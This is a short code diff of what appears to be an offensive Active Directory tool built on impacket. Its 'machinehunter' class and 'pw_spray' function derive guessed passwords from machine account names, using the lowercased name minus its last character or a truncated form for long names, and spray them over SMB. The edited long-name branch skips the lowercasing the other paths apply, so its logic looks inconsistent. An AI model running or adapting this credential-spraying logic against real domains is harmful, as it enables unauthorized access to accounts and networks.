@@ -1,5 +1,3 @@
-
-from cProfile import run
 from impacket.smbconnection import SMBConnection
 from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
 from binascii import unhexlify
@@ -358,6 +356,7 @@ class machinehunter:
             for attr in attributes:
                 val = entry[attr].value
                 if len(val) >= 15:
+                    #if account name is 15 chars or more pw is first 14
                     credentials = val + ":" + val.lower()[:-2]
                 else:
                     credentials = val + ":" + val.lower()[:-1]
@@ -403,7 +402,11 @@ def parse_input(inputfile, args):
     with open (inputfile) as f:
         y = f.read().split("\n")
         for i in y:
-            credentials = i + ":" + i.lower()[:-1]
+            if len(i) >= 15:
+                # if accountname is 15 chars or more pw is first 14
+                credentials = i[:15] + ":" + i[:14]
+            else:
+                credentials = i + ":" + i.lower()[:-1]
             creds.append(credentials)
         pw_spray(creds, args)
 
